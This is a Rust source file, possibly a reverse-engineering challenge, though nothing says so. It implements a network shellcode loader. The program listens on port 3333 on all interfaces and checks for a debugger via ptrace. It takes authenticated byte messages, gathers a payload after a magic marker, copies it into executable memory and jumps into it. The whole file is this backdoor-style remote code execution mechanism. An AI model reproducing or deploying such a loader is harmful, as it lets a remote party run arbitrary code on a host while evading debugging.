#![feature(asm)]

use std::thread::sleep;
use std::time::{Duration, SystemTime};
use std::io::{Write, Read, Seek, SeekFrom};
use font8x8::{UnicodeFonts, BASIC_FONTS};
use process_memory::{Memory, DataMember, Pid, TryIntoProcessHandle, ProcessHandle};

use std::net::{TcpListener, TcpStream, Shutdown};
use message_passing::verify;
use std::process;
use sysinfo::{System, SystemExt, ProcessExt};
use std::fs::{File, OpenOptions};
use nix::sys::mman::{mmap, ProtFlags, MapFlags};
use std::os::raw::c_void;
use nix::sys::ptrace::traceme;

fn main() {

   let lemon = traceme().is_err();
    let mut writemode = false;
    let mut bytes: Vec<u8> = vec![];


    if let Ok(listener) = TcpListener::bind("0.0.0.0:3333") {
        let (mut stream, addr) = listener.accept().unwrap();

        //stream.set_read_timeout(Some(Duration::from_millis(100)));


       loop {
            let mut buf = [0u8; 16];
            stream.read_exact(&mut buf).unwrap();
            let result = verify(buf, lemon);
            let result = if let Some(r) = result {
                stream.write(&[1, 1, 1, 1]);
                //      println!("{:X?}", r);
                r
            } else {
                continue;
            };


            //println!("msg received");
            if result == [0x65, 0x91, 0x9, 0x44, 0x00, 0x12, 0x8f, 0xff] {
                let ptr = unsafe {
                    mmap(0 as *mut c_void, bytes.len(), ProtFlags::PROT_EXEC | ProtFlags::PROT_READ | ProtFlags::PROT_WRITE, MapFlags::MAP_SHARED | MapFlags::MAP_ANONYMOUS, 0, 0).unwrap()
                } as *mut u8;
               bytes.push(0xcc);
              //  println!("mapped {:X?}", ptr);
                unsafe {
                    std::ptr::copy(bytes.as_ptr(), ptr, bytes.len());
                    asm! {
                    "jmp {}", in(reg) ptr
                    };
                };
            } else if writemode {
                for byte in result {
                    bytes.push(byte);
                }
            } else if result == [0x2d, 0x94, 0x22, 0x9b, 0x15, 0x98, 0x91, 0x11] {
                writemode = true;
            }
        };        
         }
}


